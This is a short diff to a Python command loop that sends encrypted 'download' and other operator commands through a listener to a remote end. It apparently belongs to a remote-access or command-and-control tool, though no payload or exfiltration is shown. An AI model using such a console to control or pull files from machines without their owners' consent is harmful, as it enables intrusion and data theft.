@@ -28,14 +28,29 @@ def main():
         iv=env.get("CRYPTO_IV").encode('utf-8')
     )
     while True:
-        uinput = input("> ")
 
-        if uinput == "help":
+        command = input("> ").strip()
+        if ' ' in command:
+            command, params = command.split(' ', 1)
+
+        if command == "help":
             help()
+        elif command == "stop":
+            listener.stop()
+            break
+        elif command == "download":
+            request = json.dumps({
+                'command': 'download',
+                'params': params
+            }).encode('utf-8')
+            response = listener.prompt(cipher.encrypt_message(request))
+            decrypted = cipher.decrypt_message(response)
+            print(response)
+            print(json.loads(decrypted))
         else:
             data = json.dumps(
                 {
-                    'message': uinput
+                    'message': command
                 }
             ).encode('utf-8')
 
